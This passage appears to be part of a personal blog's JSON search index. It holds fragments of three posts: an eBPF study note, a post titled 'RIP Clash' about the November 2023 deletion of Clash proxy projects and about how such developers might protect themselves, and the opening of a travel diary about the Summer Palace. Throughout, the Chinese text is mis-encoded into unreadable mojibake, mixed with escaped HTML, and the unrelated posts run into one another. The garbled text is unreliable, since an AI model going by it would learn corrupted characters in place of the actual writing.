kprobeå¯ä»¥åŠ¨æ€åœ°åœ¨æ‰€æœ‰çš„å†…æ ¸å‡½æ•°(é™¤äº†inlineå‡½æ•°)ä¸ŠæŒ‚è½½probeå‡½æ•°\u003c/p\u003e\n\u003ch3 id=\"ebpf-virtual-machine\"\u003eeBPF virtual machine\u003c/h3\u003e\n\u003cp\u003eThe ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, \u003cstrong\u003evalues get stored in these registers to keep track of state.\u003c/strong\u003e\u003c/p\u003e","title":"Learning eBPF"},{"content":"2023å¹´11åˆ,ç®€ä¸­äº’è”ç½‘åˆå‘ç”Ÿäº†ä¸€å‡ºé—¹å‰§,ä¸è¿‡äºä»¥å¾€çš„è¿‡çœ¼äº‘çƒŸæ‰€ä¸åŒçš„æ˜¯,è¿™æ¬¡çš„äº‹ä»¶å¯¼è‡´äº†ä¸€ç³»åˆ—ä¼˜ç§€å¼€æºè½¯ä»¶çš„æ¶ˆäº¡.\nèµ·å›  äº‹ä»¶çš„ç»è¿‡å…¶å®å¹¶ä¸å¤æ‚.11.2,clash for windows çš„ä½œè€…åˆ é™¤äº†githubä¸Šç”¨äºå‘å¸ƒçš„ä»“åº“ä¸­çš„ä¿¡æ¯,å¹¶åœ¨ä¸ªäººtelegramé¢‘é“ä¸Šå®£å¸ƒä¸å†å¼€å‘.ç”±äºcfwçš„æ“ä½œç®€å•,å¯¹å°ç™½å‹å¥½,å› æ­¤å…¶ç”¨æˆ·æ•°é‡ç›¸å½“ä¹‹å¤§.åˆ åº“çš„æ¶ˆæ¯å‡ºæ¥å,ç½‘å‹ä»¬çº·çº·å¼€å§‹å…³æ³¨ä½œè€…çš„ç¤¾äº¤è´¦å·,å¯¹æ˜¯å¦å› ä¿¡æ¯æ³„éœ²å¯¼è‡´è¢«æŠ“åŠ ä»¥çŒœæµ‹.å…¶å®å¯¹äºä¸€ä¸ªç½‘ç»œä»£ç†è½¯ä»¶æ¥è¯´,æ— è®ºæ˜¯å› ä¸ºè¢«è¯·å–èŒ¶è¿˜æ˜¯å› ä¸ºä½œè€…ä¸æƒ³å¹²äº†è€Œåˆ åº“éƒ½æ˜¯ä¸€ä»¶å¾ˆæ­£å¸¸çš„äº‹æƒ….\nå¦‚æœäº‹æƒ…ä»…ä»…åˆ°è¿™é‡Œå°±ç»“æŸ,é‚£ä¹ˆå¤§å®¶é¡¶å¤šä¹Ÿå°±æ„Ÿæ…¨ä¸€å¥è¿‡å»è¯´çƒ‚äº†çš„é‚£äº›è¯,ç”šè‡³å¯¹äºå¼€æºä¸»ä¹‰è€…æ¥è¯´è¿æ„Ÿæ…¨éƒ½æ²¡æœ‰,å› ä¸ºcfwæœ¬èº«å°±æ˜¯ä¸€ä¸ªé—­æºè½¯ä»¶,è€Œgithubä»…ä»…æ˜¯ç”¨æ¥å‘å¸ƒäºŒè¿›åˆ¶åŒ…çš„.\nä½†æ˜¯äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•.\nclash for windowsæ˜¯åŸºäºå¼€æºçš„clash coreæ ¸å¿ƒä»£ç åšçš„å›¾å½¢åŒ–å®¢æˆ·ç«¯å·¥å…·,è€Œè¯¥æ ¸å¿ƒä»£ç åŒæ ·æ˜¯ä¸€ç³»åˆ—ç±»ä¼¼è½¯ä»¶ï¼ˆä¾‹å¦‚clash x, clash metaï¼‰çš„åŸºç¡€ç»„ä»¶.æˆ–è®¸æ˜¯å‡ºäºå¯¹clash coreä½œè€…çš„å°Šé‡,è¿™äº›é¡¹ç›®çš„åç§°ä¸­ä¹Ÿéƒ½åŒ…å«äº†clashå­—æ ·.\né€šå¸¸æƒ…å†µä¸‹,å¼€å‘è€…å¹¶ä¸ä¼šåœ¨æ„è‡ªå·±çš„è½¯ä»¶è¢«æ™®é€šç”¨æˆ·å’Œå…¶ä»–clashç›¸å…³è½¯ä»¶ææ··.è€Œå¯¹äºcfwç”¨æˆ·,å°¤å…¶æ˜¯å…¶ä¸­çš„å°ç™½ç”¨æˆ·æ¥è¯´,ä»–ä»¬ä¸­çš„å¤§éƒ¨åˆ†ä»…ä»…æ¥è§¦è¿‡cfw,å› æ­¤åœ¨å£å£ç›¸ä¼ ä¸­ä¼šè‡ªç„¶è€Œç„¶åœ°å°†clashè¿™ä¸ªæœ‰ç‰¹å¾çš„è¯ä½œä¸ºclash for windowsçš„æŒ‡ä»£ä»¥èŠ‚çº¦æ²Ÿé€šæˆæœ¬,cfwæ˜¯clash, clashæ˜¯cfw.\nå› æ­¤,cfwè¢«åˆ åº“å,æ¶ˆæ¯é€šè¿‡äº’è”ç½‘åœ¨ç”¨æˆ·ç¾¤ä½“ä¹‹é—´å¼€å§‹å¹¿æ³›ä¼ æ’­å¼€æ¥,å¾ˆå¿«å°±æ¼”å˜ä¸ºäº†ä¸‹é¢è¿™å¼ å›¾ä¸Šçš„æ¶ˆæ¯.\nå‡æ¶ˆæ¯åªæ˜¯ç¬¬ä¸€æ­¥.å¯¹äºå¤§éƒ¨åˆ†cfwçš„ç”¨æˆ·æ¥è¯´,ä»–ä»¬ä¼¼ä¹å¹¶ä¸çŸ¥é“æ­¤ç§è½¯ä»¶çš„æ•æ„Ÿç¨‹åº¦å’Œè½¯ä»¶ä½œè€…æ‰€é¢ä¸´çš„é£é™©,ä»–ä»¬åªæ˜¯åœ¨ç›²ç›®åœ°åœ¨å„å¤§ç¤¾äº¤åª’ä½“ä¸Šå‘é—®,è€Œå¾ˆé—æ†¾å´ä¹Ÿæ„æ–™ä¹‹ä¸­çš„,è¿™å…¶ä¸­,åŒ…æ‹¬äº†å¾®åš.\nå‰é¢æåˆ°,cfwçš„ä½é—¨æ§›ä¸ºå®ƒå¸¦æ¥äº†ä¼—å¤šçš„ç”¨æˆ·,è€Œç°åœ¨,è¿™äº›ç”¨æˆ·å°†æˆä¸ºå‹æ­»æ‰€æœ‰clashç›¸å…³é¡¹ç›®çš„ç¨»è‰.ç”±äºæé—®å’Œåƒç“œçš„äººå¤ªå¤š,ç›¸å…³è¯é¢˜çš„çƒ­åº¦ä¸æ–­ä¸Šå‡,è¯¥è¯é¢˜å¾ˆå¿«å‡ºç°åœ¨äº†å¾®åšçš„çƒ­æœä¸Š.\näºæ˜¯äº‹æƒ…å¤±æ§äº†.\nç»“æœ 11æœˆ3å·,å‡ºäºå¯¹è‡ªèº«å®‰å…¨çš„è€ƒè™‘,å‡ ä¹æ‰€æœ‰clashç›¸å…³è½¯ä»¶ä½œè€…,åŒ…æ‹¬clashå†…æ ¸é¡¹ç›®ä½œè€…,é›†ä½“å°†ä»£ç åº“åˆ é™¤.ä¸€ä¸ªæŒç»­äº†æ•°å¹´,å¸®åŠ©åˆ°è®¸å¤šç½‘æ°‘çš„è½¯ä»¶,å´å› ä¸ºç½‘æ°‘ä»¬çš„æ— çŸ¥,åœ¨ä¸€å¤©ä¹‹é—´å†…å°½æ•°æ¶ˆäº¡.æ•´ä¸ªè¿‡ç¨‹å®åœ¨å¤ªå¿«,å¿«å¾—æ ¹æœ¬ä¸åƒæœ‰å…³éƒ¨é—¨çš„æœ‰ç»„ç»‡è¡ŒåŠ¨.å› ä¸ºé©±ä½¿é¡¹ç›®æ¶ˆäº¡çš„,ä»…ä»…åªæ˜¯ç½‘æ°‘ä»¬çš„ç‹‚æ¬¢,å’Œå¼€æºä½œè€…ä»¬çš„ææƒ§.\nè€Œå¯æ‚²çš„æ˜¯,åœ¨åˆ åº“æ—¶é—´ç»“æŸå,clashåœ¨å¾®åšçš„è¯é¢˜çƒ­åº¦æ›´é«˜äº†,æ˜¯çš„,æ²¡æœ‰äººå…³å¿ƒé¡¹ç›®ä½œè€…æ˜¯å¦ä¼šå› ä¸ºè¿™åœºé£æ³¢è€Œè¢«æ•å…¥ç‹±,ä»–ä»¬åªæƒ³å››å¤„æ‰“å¬,åƒç“œ,å¹¶è¿«åˆ‡åœ°å¸Œæœ›çœ‹åˆ°è¡€æµæˆæ²³. ä¸€ç›´åˆ°ç°åœ¨, æœ‰å…³è¯é¢˜åœ¨telegramä¸Šè¿˜åœ¨è¢«æŒç»­ä¸æ–­çš„äº‰è®ºä¸­, å…¶ä¸­è·³å‡ºäº†ä¸€äº›äººæ¥è¯•å›¾é€šè¿‡æé€ äº‹å®æŠ¹é»‘å¤šä½ä½œè€…æ¥æ´—è„±è‡ªèº«çš„è´£ä»».\nå¯ç¬‘çš„æ˜¯,å½“è¢«è¦æ±‚æ”¾å‡ºå¯¹åº”çš„é¡¹ç›®æ—¶,æ­¤äººå¼€å§‹è½¬ç§»è¯é¢˜,å¹¶ä¸”åœ¨ä»–è‡†æƒ³çš„æƒ…å†µä¸‹,å¯¹ä½œè€…è¿›è¡Œäº†äººèº«æ”»å‡».\nå¯æ‚²çš„æ˜¯,è¿™ç§äººåœ¨è¿™åœºé£æ³¢ä¸­å¹¶ä¸å°‘è§,ä»–ä»¬ä¸ä»…ä»…æ˜¯æ— çŸ¥,æ›´æ˜¯æ— è€».\næ•™è®­ å…¶å®å•çº¯è´£æ€ªç”¨æˆ·å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰,æ¯•ç«Ÿåƒcfwè¿™æ ·æ–¹ä¾¿çš„è½¯ä»¶,å…¶ç”¨æˆ·ç¾¤ä½“æ˜¯é±¼é¾™æ··æ‚çš„,è¦æ±‚ä»–ä»¬é›†ä½“æå‡ç›¸å…³çš„æ„è¯†ä¹Ÿæ˜¯ä¸ç°å®çš„,æ‰€ä»¥å¾ˆé—æ†¾,å°½ç®¡æˆ‘ä»¬å¯ä»¥æ–¥è´£éƒ¨åˆ†çš„å¾®åšç”¨æˆ·,ä½†æ˜¯å½’æ ¹åˆ°åº•,å¦‚ä½•æ”¹å˜æ­¤ç±»è½¯ä»¶å°¤å…¶æ˜¯å¼€æºè½¯ä»¶çš„å±é™©ç°çŠ¶,ä½œè€…è¯¥åšå‡ºä»€ä¹ˆæ ·çš„æ”¹å˜æ¥æ›´å¥½åœ°ä¿æŠ¤è‡ªå·±,æ‰æ˜¯æ›´æœ‰ç°å®æ„ä¹‰çš„è¯é¢˜.\nå…·ä½“æ¥è¯´, å¯¹æˆ‘è€Œè¨€, é™¤éå¼€æºè½¯ä»¶åˆæ³•åˆè§„,å¦åˆ™:\nä¸è¦åšwindowså¹³å°ä¸‹çš„è½¯ä»¶ ä¸è¦åœ¨é¡¹ç›®ä¸­åŒ…å«ç®€ä½“ä¸­æ–‡è¯´æ˜ ä¸è¦å–æœ—æœ—ä¸Šå£å¥½è®°çš„é¡¹ç›®å æ§åˆ¶æ¨å¹¿èŒƒå›´,å°±æ˜¯å¯¹ä½œè€…æœ€å¤§çš„ä¿æŠ¤ å°½ç®¡ä»¥ä¸Šæªæ–½ä¼šé™åˆ¶è½¯ä»¶çš„ä½¿ç”¨èŒƒå›´,ä½†æ˜¯å¯¹äºæ­¤ç±»è½¯ä»¶æ¥è¯´,å¼€å‘è€…çš„äººèº«å®‰å…¨æ‰æ˜¯ç¬¬ä¸€ä½çš„.\nåªæ˜¯,è¿™äº›æ•™è®­,å¯¹äºå·²ç»æ¶ˆäº¡çš„é¡¹ç›®æ¥è¯´,å·²ç»å¤ªè¿Ÿäº†.\nå‚è€ƒ https://github.com/net4people/bbs/issues/303 https://www.eaimty.com/2023/opensource-project-based-on-hormone/\n","permalink":"https://dragonbox.top/posts/gossip-rip-clash/","summary":"\u003cp\u003e2023å¹´11åˆ,ç®€ä¸­äº’è”ç½‘åˆå‘ç”Ÿäº†ä¸€å‡ºé—¹å‰§,ä¸è¿‡äºä»¥å¾€çš„è¿‡çœ¼äº‘çƒŸæ‰€ä¸åŒçš„æ˜¯,è¿™æ¬¡çš„äº‹ä»¶å¯¼è‡´äº†ä¸€ç³»åˆ—ä¼˜ç§€å¼€æºè½¯ä»¶çš„æ¶ˆäº¡.\u003c/p\u003e\n\u003ch2 id=\"èµ·å› \"\u003eèµ·å› \u003c/h2\u003e\n\u003cp\u003eäº‹ä»¶çš„ç»è¿‡å…¶å®å¹¶ä¸å¤æ‚.11.2,clash for windows çš„ä½œè€…åˆ é™¤äº†githubä¸Šç”¨äºå‘å¸ƒçš„ä»“åº“ä¸­çš„ä¿¡æ¯,å¹¶åœ¨ä¸ªäººtelegramé¢‘é“ä¸Šå®£å¸ƒä¸å†å¼€å‘.ç”±äºcfwçš„æ“ä½œç®€å•,å¯¹å°ç™½å‹å¥½,å› æ­¤å…¶ç”¨æˆ·æ•°é‡ç›¸å½“ä¹‹å¤§.åˆ åº“çš„æ¶ˆæ¯å‡ºæ¥å,ç½‘å‹ä»¬çº·çº·å¼€å§‹å…³æ³¨ä½œè€…çš„ç¤¾äº¤è´¦å·,å¯¹æ˜¯å¦å› ä¿¡æ¯æ³„éœ²å¯¼è‡´è¢«æŠ“åŠ ä»¥çŒœæµ‹.å…¶å®å¯¹äºä¸€ä¸ªç½‘ç»œä»£ç†è½¯ä»¶æ¥è¯´,æ— è®ºæ˜¯å› ä¸ºè¢«è¯·å–èŒ¶è¿˜æ˜¯å› ä¸ºä½œè€…ä¸æƒ³å¹²äº†è€Œåˆ åº“éƒ½æ˜¯ä¸€ä»¶å¾ˆæ­£å¸¸çš„äº‹æƒ….\u003c/p\u003e\n\u003cp\u003eå¦‚æœäº‹æƒ…ä»…ä»…åˆ°è¿™é‡Œå°±ç»“æŸ,é‚£ä¹ˆå¤§å®¶é¡¶å¤šä¹Ÿå°±æ„Ÿæ…¨ä¸€å¥è¿‡å»è¯´çƒ‚äº†çš„é‚£äº›è¯,ç”šè‡³å¯¹äºå¼€æºä¸»ä¹‰è€…æ¥è¯´è¿æ„Ÿæ…¨éƒ½æ²¡æœ‰,å› ä¸ºcfwæœ¬èº«å°±æ˜¯ä¸€ä¸ªé—­æºè½¯ä»¶,è€Œgithubä»…ä»…æ˜¯ç”¨æ¥å‘å¸ƒäºŒè¿›åˆ¶åŒ…çš„.\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•.\u003c/p\u003e\n\u003cp\u003eclash for windowsæ˜¯åŸºäºå¼€æºçš„clash coreæ ¸å¿ƒä»£ç åšçš„å›¾å½¢åŒ–å®¢æˆ·ç«¯å·¥å…·,è€Œè¯¥æ ¸å¿ƒä»£ç åŒæ ·æ˜¯ä¸€ç³»åˆ—ç±»ä¼¼è½¯ä»¶ï¼ˆä¾‹å¦‚clash x, clash metaï¼‰çš„åŸºç¡€ç»„ä»¶.æˆ–è®¸æ˜¯å‡ºäºå¯¹clash coreä½œè€…çš„å°Šé‡,è¿™äº›é¡¹ç›®çš„åç§°ä¸­ä¹Ÿéƒ½åŒ…å«äº†clashå­—æ ·.\u003c/p\u003e\n\u003cp\u003eé€šå¸¸æƒ…å†µä¸‹,å¼€å‘è€…å¹¶ä¸ä¼šåœ¨æ„è‡ªå·±çš„è½¯ä»¶è¢«æ™®é€šç”¨æˆ·å’Œå…¶ä»–clashç›¸å…³è½¯ä»¶ææ··.è€Œå¯¹äºcfwç”¨æˆ·,å°¤å…¶æ˜¯å…¶ä¸­çš„å°ç™½ç”¨æˆ·æ¥è¯´,ä»–ä»¬ä¸­çš„å¤§éƒ¨åˆ†ä»…ä»…æ¥è§¦è¿‡cfw,å› æ­¤åœ¨å£å£ç›¸ä¼ ä¸­ä¼šè‡ªç„¶è€Œç„¶åœ°å°†clashè¿™ä¸ªæœ‰ç‰¹å¾çš„è¯ä½œä¸ºclash for windowsçš„æŒ‡ä»£ä»¥èŠ‚çº¦æ²Ÿé€šæˆæœ¬,cfwæ˜¯clash, clashæ˜¯cfw.\u003c/p\u003e\n\u003cp\u003eå› æ­¤,cfwè¢«åˆ åº“å,æ¶ˆæ¯é€šè¿‡äº’è”ç½‘åœ¨ç”¨æˆ·ç¾¤ä½“ä¹‹é—´å¼€å§‹å¹¿æ³›ä¼ æ’­å¼€æ¥,å¾ˆå¿«å°±æ¼”å˜ä¸ºäº†ä¸‹é¢è¿™å¼ å›¾ä¸Šçš„æ¶ˆæ¯.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"photo_2023-11-04_10-17-56.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå‡æ¶ˆæ¯åªæ˜¯ç¬¬ä¸€æ­¥.å¯¹äºå¤§éƒ¨åˆ†cfwçš„ç”¨æˆ·æ¥è¯´,ä»–ä»¬ä¼¼ä¹å¹¶ä¸çŸ¥é“æ­¤ç§è½¯ä»¶çš„æ•æ„Ÿç¨‹åº¦å’Œè½¯ä»¶ä½œè€…æ‰€é¢ä¸´çš„é£é™©,ä»–ä»¬åªæ˜¯åœ¨ç›²ç›®åœ°åœ¨å„å¤§ç¤¾äº¤åª’ä½“ä¸Šå‘é—®,è€Œå¾ˆé—æ†¾å´ä¹Ÿæ„æ–™ä¹‹ä¸­çš„,è¿™å…¶ä¸­,åŒ…æ‹¬äº†å¾®åš.\u003c/p\u003e\n\u003cp\u003eå‰é¢æåˆ°,cfwçš„ä½é—¨æ§›ä¸ºå®ƒå¸¦æ¥äº†ä¼—å¤šçš„ç”¨æˆ·,è€Œç°åœ¨,è¿™äº›ç”¨æˆ·å°†æˆä¸ºå‹æ­»æ‰€æœ‰clashç›¸å…³é¡¹ç›®çš„ç¨»è‰.ç”±äºæé—®å’Œåƒç“œçš„äººå¤ªå¤š,ç›¸å…³è¯é¢˜çš„çƒ­åº¦ä¸æ–­ä¸Šå‡,è¯¥è¯é¢˜å¾ˆå¿«å‡ºç°åœ¨äº†å¾®åšçš„çƒ­æœä¸Š.\u003c/p\u003e\n\u003cp\u003eäºæ˜¯äº‹æƒ…å¤±æ§äº†.\u003c/p\u003e\n\u003ch2 id=\"ç»“æœ\"\u003eç»“æœ\u003c/h2\u003e\n\u003cp\u003e11æœˆ3å·,å‡ºäºå¯¹è‡ªèº«å®‰å…¨çš„è€ƒè™‘,å‡ ä¹æ‰€æœ‰clashç›¸å…³è½¯ä»¶ä½œè€…,åŒ…æ‹¬clashå†…æ ¸é¡¹ç›®ä½œè€…,é›†ä½“å°†ä»£ç åº“åˆ é™¤.ä¸€ä¸ªæŒç»­äº†æ•°å¹´,å¸®åŠ©åˆ°è®¸å¤šç½‘æ°‘çš„è½¯ä»¶,å´å› ä¸ºç½‘æ°‘ä»¬çš„æ— çŸ¥,åœ¨ä¸€å¤©ä¹‹é—´å†…å°½æ•°æ¶ˆäº¡.æ•´ä¸ªè¿‡ç¨‹å®åœ¨å¤ªå¿«,å¿«å¾—æ ¹æœ¬ä¸åƒæœ‰å…³éƒ¨é—¨çš„æœ‰ç»„ç»‡è¡ŒåŠ¨.å› ä¸ºé©±ä½¿é¡¹ç›®æ¶ˆäº¡çš„,ä»…ä»…åªæ˜¯ç½‘æ°‘ä»¬çš„ç‹‚æ¬¢,å’Œå¼€æºä½œè€…ä»¬çš„ææƒ§.\u003c/p\u003e\n\u003cp\u003eè€Œå¯æ‚²çš„æ˜¯,åœ¨åˆ åº“æ—¶é—´ç»“æŸå,clashåœ¨å¾®åšçš„è¯é¢˜çƒ­åº¦æ›´é«˜äº†,æ˜¯çš„,æ²¡æœ‰äººå…³å¿ƒé¡¹ç›®ä½œè€…æ˜¯å¦ä¼šå› ä¸ºè¿™åœºé£æ³¢è€Œè¢«æ•å…¥ç‹±,ä»–ä»¬åªæƒ³å››å¤„æ‰“å¬,åƒç“œ,å¹¶è¿«åˆ‡åœ°å¸Œæœ›çœ‹åˆ°è¡€æµæˆæ²³. ä¸€ç›´åˆ°ç°åœ¨, æœ‰å…³è¯é¢˜åœ¨telegramä¸Šè¿˜åœ¨è¢«æŒç»­ä¸æ–­çš„äº‰è®ºä¸­, å…¶ä¸­è·³å‡ºäº†ä¸€äº›äººæ¥è¯•å›¾é€šè¿‡æé€ äº‹å®æŠ¹é»‘å¤šä½ä½œè€…æ¥æ´—è„±è‡ªèº«çš„è´£ä»».\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"normal.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå¯ç¬‘çš„æ˜¯,å½“è¢«è¦æ±‚æ”¾å‡ºå¯¹åº”çš„é¡¹ç›®æ—¶,æ­¤äººå¼€å§‹è½¬ç§»è¯é¢˜,å¹¶ä¸”åœ¨ä»–è‡†æƒ³çš„æƒ…å†µä¸‹,å¯¹ä½œè€…è¿›è¡Œäº†äººèº«æ”»å‡».\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"attack.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå¯æ‚²çš„æ˜¯,è¿™ç§äººåœ¨è¿™åœºé£æ³¢ä¸­å¹¶ä¸å°‘è§,ä»–ä»¬ä¸ä»…ä»…æ˜¯æ— çŸ¥,æ›´æ˜¯æ— è€».\u003c/p\u003e\n\u003ch2 id=\"æ•™è®­\"\u003eæ•™è®­\u003c/h2\u003e\n\u003cp\u003eå…¶å®å•çº¯è´£æ€ªç”¨æˆ·å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰,æ¯•ç«Ÿåƒcfwè¿™æ ·æ–¹ä¾¿çš„è½¯ä»¶,å…¶ç”¨æˆ·ç¾¤ä½“æ˜¯é±¼é¾™æ··æ‚çš„,è¦æ±‚ä»–ä»¬é›†ä½“æå‡ç›¸å…³çš„æ„è¯†ä¹Ÿæ˜¯ä¸ç°å®çš„,æ‰€ä»¥å¾ˆé—æ†¾,å°½ç®¡æˆ‘ä»¬å¯ä»¥æ–¥è´£éƒ¨åˆ†çš„å¾®åšç”¨æˆ·,ä½†æ˜¯å½’æ ¹åˆ°åº•,å¦‚ä½•æ”¹å˜æ­¤ç±»è½¯ä»¶å°¤å…¶æ˜¯å¼€æºè½¯ä»¶çš„å±é™©ç°çŠ¶,ä½œè€…è¯¥åšå‡ºä»€ä¹ˆæ ·çš„æ”¹å˜æ¥æ›´å¥½åœ°ä¿æŠ¤è‡ªå·±,æ‰æ˜¯æ›´æœ‰ç°å®æ„ä¹‰çš„è¯é¢˜.\u003c/p\u003e\n\u003cp\u003eå…·ä½“æ¥è¯´, å¯¹æˆ‘è€Œè¨€, é™¤éå¼€æºè½¯ä»¶åˆæ³•åˆè§„,å¦åˆ™:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eä¸è¦åšwindowså¹³å°ä¸‹çš„è½¯ä»¶\u003c/li\u003e\n\u003cli\u003eä¸è¦åœ¨é¡¹ç›®ä¸­åŒ…å«ç®€ä½“ä¸­æ–‡è¯´æ˜\u003c/li\u003e\n\u003cli\u003eä¸è¦å–æœ—æœ—ä¸Šå£å¥½è®°çš„é¡¹ç›®å\u003c/li\u003e\n\u003cli\u003eæ§åˆ¶æ¨å¹¿èŒƒå›´,å°±æ˜¯å¯¹ä½œè€…æœ€å¤§çš„ä¿æŠ¤\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå°½ç®¡ä»¥ä¸Šæªæ–½ä¼šé™åˆ¶è½¯ä»¶çš„ä½¿ç”¨èŒƒå›´,ä½†æ˜¯å¯¹äºæ­¤ç±»è½¯ä»¶æ¥è¯´,å¼€å‘è€…çš„äººèº«å®‰å…¨æ‰æ˜¯ç¬¬ä¸€ä½çš„.\u003c/p\u003e\n\u003cp\u003eåªæ˜¯,è¿™äº›æ•™è®­,å¯¹äºå·²ç»æ¶ˆäº¡çš„é¡¹ç›®æ¥è¯´,å·²ç»å¤ªè¿Ÿäº†.\u003c/p\u003e\n\u003ch2 id=\"å‚è€ƒ\"\u003eå‚è€ƒ\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/net4people/bbs/issues/303\"\u003ehttps://github.com/net4people/bbs/issues/303\u003c/a\u003e\n\u003ca href=\"https://www.eaimty.com/2023/opensource-project-based-on-hormone/\"\u003ehttps://www.eaimty.com/2023/opensource-project-based-on-hormone/\u003c/a\u003e\u003c/p\u003e","title":"RIP Clash"},{"content":" ä¸æ‰€çˆ±ä¹‹äººåœ¨ä¸€èµ·çš„æ—¶å…‰, ä¼šç”Ÿå‡ºäº’ç›¸çš„çæƒœ, è¿™ä»½çæƒœçŠ¹å¦‚é£ç­çº¿ä¸€èˆ¬, å³ä¾¿å¯¹æ–¹è¿œåœ¨äº‘ç«¯, ä¾æ—§å¯ä»¥æ„ŸçŸ¥åˆ°å…¶å¿ƒå¿µæ‰€åŠ¨, äºæ˜¯æ€å¿µç”±æ­¤è€Œç”Ÿ.\nåœ¨yqæˆåŠŸä¸Šå²¸å®¶ä¹¡çš„æ•™å¸ˆç¼–å, ä¸ºäº†åº†ç¥, ä¹Ÿä¸ºäº†ç¼“è§£è®¸ä¹…æœªè§çš„ç›¸æ€ä¹‹è‹¦, æˆ‘åŒ†å¿™è®¡åˆ’äº†ä¸€ä¸‹è¡Œç¨‹, ä¸€è¾¹è®©å¥¹è®¢æ¥åŒ—äº¬çš„è½¦ç¥¨, ä¸€è¾¹æ€è€ƒé™„è¿‘å“ªé‡Œæœ‰å–é¦™æ§Ÿçš„.\né¢å’Œå›­ é€‰æ‹©é¢å’Œå›­, æ˜¯å› ä¸ºç¦»ä¿¡å·¥æ‰€æ¯”è¾ƒè¿‘. å½“æ—¥åŸæœ¬æƒ³å¸¦yqå»æˆ‘å¹³æ—¶å»çš„æ—©é¤åº—, å¯æƒœæˆ‘ä»¬å‡ºå‘ä¹‹æ—¶, å·²æ˜¯ä¸­åˆåäºŒç‚¹äº†, äºæ˜¯å¸¦å¥¹åƒä¹‹å‰æ¨èè¿‡çš„æ„å¤§åˆ©æ²™å¿è¨è‰äºš. è¿™æ˜¯ä¸€ä¸ªä»·æ ¼éå¸¸äº²æ°‘çš„æ„å¤§åˆ©è¥¿é¤å…, çœ‹äº†çœ‹èœå•ä¸Šåå‡ äºŒåå…ƒçš„èœå“å, æˆ‘ä»¬å½»åº•æ”¾ä¸‹äº†å¯¹ä»·æ ¼çš„é¡¾è™‘, ä»…ä»…è€ƒè™‘å£å‘³å’Œèƒƒå£. å®é™…ä¸Šè¿™å®¶åº—çš„å£å‘³ç¡®å®ä¸é”™, ç‰¹åˆ«æ˜¯è˜‘è‡æµ“æ±¤, è™½ç„¶è‚¯å®šä¸èƒ½è¯´é¡¶çº§, ä½†è¿™ç§ä¸ç”¨é¡¾è™‘ä»·æ ¼å°±äº«å—è¥¿é¤çš„è½»æ¾æ„Ÿ, ç‹¬æ­¤ä¸€ä»½ (è¯´ç™½äº†è¿˜æ˜¯å¤ªç©·).\né˜³å…‰æ­£å¥½, æ™’åœ¨èº«ä¸Šæš–æ´‹æ´‹çš„. æˆ‘ä»¬åœ¨ä¸‹å…¬äº¤ä¹‹å, æ…¢æ…¢æ‚ æ‚ å‰å¾€é¢å’Œå›­çš„å…¥å£, è·¯ä¸Šè½å¶é£èˆ, å´æ— åŠç‚¹è§æ¡, è¡Œäººæ¥æ¥å¾€å¾€, ä¸€ä¸ªå©´å„¿è½¦é‡Œçš„å°å­©æŒ‡ç€å¦ä¸€ä¸ªåœ¨å¦ˆå¦ˆè‡ªè¡Œè½¦è½¦ç­é‡Œçš„å°å­©ç¾¡æ…•åœ°å“‡å“‡ç›´å«, æƒ¹å¾—ä¸¤è¾¹çš„å®¶é•¿å¿ä¿Šä¸ç¦. èµ°èµ°åœåœä¹‹é—´, æˆ‘ä»¬æ—¶è€Œåœ¨è·¯è¾¹çš„äº­å­é‡Œæ­‡è„š, æ—¶è€Œåœ¨çº¢ç –ç»¿ç“¦çš„ä¸çŸ¥ååºœé—¨å‰é©»è¶³æ‹ç…§, å¿ƒä¸‹ä¸€ç‰‡é—²é€‚.\nè¿›å…¥é¢å’Œå›­åæ‰å‘ç°è¿™é‡Œå‡ºä¹æ„æ–™çš„å¤§, ä½†æƒ³æƒ³è¿™æ¯•ç«Ÿæ˜¯çš‡å¸çš„æ¸¸ç©ä¹‹åœ°, å€’ä¹Ÿç®—åˆç†. æˆ‘ä»¬ç»•è¿‡å¨æ­¦çš„éº’éºŸåƒ, è·¯è¿‡çš‡å¸æ…ˆç¦§ä¸´æ—¶å¬æ”¿çš„ä»å¯¿å®«å’Œä¸€æ£µæ£µç™¾å¹´é¾™æŸ, ç©¿è¿‡åŸå…³, æ¥åˆ°è°è¶£å›­. å› ä¸ºæ˜¯ç§‹å¤©çš„ç¼˜æ•…, å°½ç®¡æ°”æ¸©å¹¶ä¸è®©äººè§‰å¾—æœ‰ç§‹æ„, ä½†æ˜¯æ± ä¸­çš„è·èŠ±å·²ç»å°½æ•°æ¯è, é£å…‰ä¸å†, å®›å¦‚é‚£ä¸ªæ­»å»å¤šæ—¶çš„ç‹æœ. æ²¿ç€å›å»Šè¡Œèµ°, æˆ‘æ¼äºè¿™è¡Œèµ°çš„ç©ºé—´ç«Ÿç„¶å¦‚æ­¤ç‹­çª„, å¤ä»£çš„çš‡å¸ä¸ä¸äººå¹¶è‚©è¡Œèµ°, å…¶ä»–çš„äººåªèƒ½å°¾éš, å› æ­¤å‡¡æ˜¯èµ°å»Šä¸€ç±»çš„åœ°æ–¹éƒ½å¯ä»¥è®¾è®¡åœ°çª„å°ä¸€äº›, åªæ˜¯æˆ‘ä¸ç¦å¼€å§‹æ— ç«¯æ€è€ƒ, é•¿æœŸåœ°å¤„äºè¿™æ ·çš„ç©ºé—´é‡Œ, äººçš„å¿ƒèƒ¸çœ¼ç•Œæ˜¯å¦ä¹Ÿä¼šå˜å¾—ç‹­å°å‘¢?\nä¸€è·¯ä¸Šçœ‹åˆ°äº†è®¸å¤šæ ¼æ ¼æ‰“æ‰®çš„å¥³ç”Ÿåœ¨å‡¹é€ 